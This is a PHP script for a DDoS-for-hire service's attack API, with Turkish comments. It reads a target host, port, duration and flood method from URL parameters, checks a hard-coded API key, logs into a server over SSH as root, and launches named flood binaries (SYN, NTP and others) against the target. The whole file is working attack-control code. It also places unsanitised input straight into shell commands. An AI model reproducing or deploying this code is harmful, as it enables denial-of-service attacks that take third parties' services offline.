  
<?php
/////////////////////////////////
//--     MERTBEY DDoS APİ V.12.2    --//
/////////////////////////////////
ignore_user_abort(true);
set_time_limit(0);
//////////////////////////////////////////
//--   Sunucu kimlik bilgileriniz   --//
//--  Sunucu kimlik bilgilerinizi Girin --//
//////////////////////////////////////////
$server_ip = "8.8.8.8"; //Sunucu İp Adres Bilgilerinizi Giriniz
$server_pass = "password"; //Sunucu Şifre Değiştir
$server_user = "root"; //Bunu yalnızca root dışında bir kullanıcı kullanıyorsanız değiştirin.
 
/////////////////////////////////////////
//-- Her değişkenin değerini alır --//
/////////////////////////////////////////
$key = $_GET['key'];
$host = $_GET['host'];
$port = intval($_GET['port']);
$time = intval($_GET['time']);
$method = $_GET['method'];
$action = $_GET['action'];
 
///////////////////////////////////////////////////
//-- bir değişken olarak uygulanan yöntem dizisi --//
///////////////////////////////////////////////////
$array = array("Fuckery", "TcpSyn", "MertOVH", "MertBursa", "NTPD", "MTP", "MertDGN", "MertColoEx1", "stop");// Add you're existing methods here, and delete you're none existent methods.
$ray = array("apikey");
 
////////////////////////////////////////
//-- API anahtarının doğru olup olmadığını kontrol eder --//
////////////////////////////////////////
if (!empty($key)){
}else{
die('Error: API key is empty!');}
 
//////////////////////////////////////////
//-- API anahtarının doğru olup olmadığını kontrol eder --//
//////////////////////////////////////////
if (in_array($key, $ray)){ //Change "key" to what ever yo want you're API key to be.
}else{
die('Error: Incorrect API key!');}
 
/////////////////////////////////
//-- Ana bilgisayarın boş olup olmadığını kontrol eder --//
/////////////////////////////////
if (!empty($time)){
}else{
die('Error: time is empty!');}
 
/////////////////////////////////
//-- Ana bilgisayarın boş olup olmadığını kontrol eder --//
/////////////////////////////////
if (!empty($host)){
}else{
die('Error: Host is empty!');}
///////////////////////////////////
//-- Yöntemin boş olup olmadığını kontrol eder --//
///////////////////////////////////
if (!empty($method)){
}else{
die('Error: Method is empty!');}
 
///////////////////////////////////
//-- Yöntemin boş olup olmadığını kontrol eder --//
///////////////////////////////////
if (in_array($method, $array)){
}else{
die('Error: The method you requested does not exist!');}
///////////////////////////////////////////////////
//-- Kullanıyorsa, bu bağlantı Noktası olabilir mi yoksa normal bir--//
///////////////////////////////////////////////////
if ($port > 44405){
die('Error: Ports over 44405 do not exist');}
 
//////////////////////////////////
//-- Maksimum önyükleme süresini ayarlar --//
//////////////////////////////////             
if ($time > 2000){
die('Error: Cannot exceed 36000 seconds!');} //Change 10 to the time you used above.
 
if(ctype_digit($Time)){
die('Error: Time is not in numeric form!');}
 
if(ctype_digit($Port)){
die('Error: Port is not in numeric form!');}
 
//////////////////////////////////////////////////////////////////////////////

//Eklediğiniz her yöntem için komutun doğru şekilde biçimlendirildiğinden emin olun//

//////////////////////////////////////////////////////////////////////////////
if ($method == "Fuckery") { $command = "screen -dm /root/./Fuckery $host -p  $port -z 0 -t $time"; }
if ($method == "TcpSyn") { $command = "screen -dm /root/TcpSyn $host $port 2 -1 $time 31.31.31.31"; }
if ($method == "MertOVH") { $command = "screen -dm /root/MertOVH $host $port ntp.txt 3 $time"; }
if ($method == "MertBursa") { $command = "screen -dm /root/MertBursa $host -p $port -t  $time"; }
if ($method == "NTPD") { $command = "screen -dm /root/NTPD $host $port 50 -1 $time"; }
if ($method == "MTP") { $command = "screen -dm /root/MTP $host $port 300 $time"; }
if ($method == "MertDGN") { $command = "screen -dm /root/MertDGN $host $port 50 50  $time"; }
if ($method == "MertColoEx1") { $command = "screen -dm /root/MertDGN $host $port 1 -1  $time 213.80.42.100"; }
if ($method == "stop") { $command = "pkill $host -f"; }
///////////////////////////////////////////////////////
//-- Sunucunun SSH2 yüklü olup olmadığını kontrol edin --//
///////////////////////////////////////////////////////
if (!function_exists("ssh2_connect")) die("Error: SSH2 does not exist on you're server");
if(!($con = ssh2_connect($server_ip, 22))){
  echo "Error: Connection Issue";
} else {
 
///////////////////////////////////////////////////
//-- Kimlik bilgilerinizle giriş yapmaya çalışır --//
///////////////////////////////////////////////////
    if(!ssh2_auth_password($con, $server_user, $server_pass)) {
        echo "Error: Login failed, one or more of you're server credentials are incorect.";
    } else {
       
////////////////////////////////////////////////////////////////////////////
//-- Saldırıyı istenen yöntem ve ayarlarla yürütmeye çalışır --//
////////////////////////////////////////////////////////////////////////////   
        if (!($stream = ssh2_exec($con, $command ))) {
            echo "Error: You're server was not able to execute you're methods file and or its dependencies";
        } else {
////////////////////////////////////////////////////////////////////
//-- Saldırıyı istenen yöntem ve ayarlarla gerçekleştirdi --//
////////////////////////////////////////////////////////////////////      
            stream_set_blocking($stream, false);
            $data = "";
            while ($buf = fread($stream,4096)) {
                $data .= $buf;
            }
                        echo "Attack started!!</br>Hitting: $host</br>On Port: $port </br>Attack Length: $time</br>With: $method";
            fclose($stream);
        }
    }
}
?>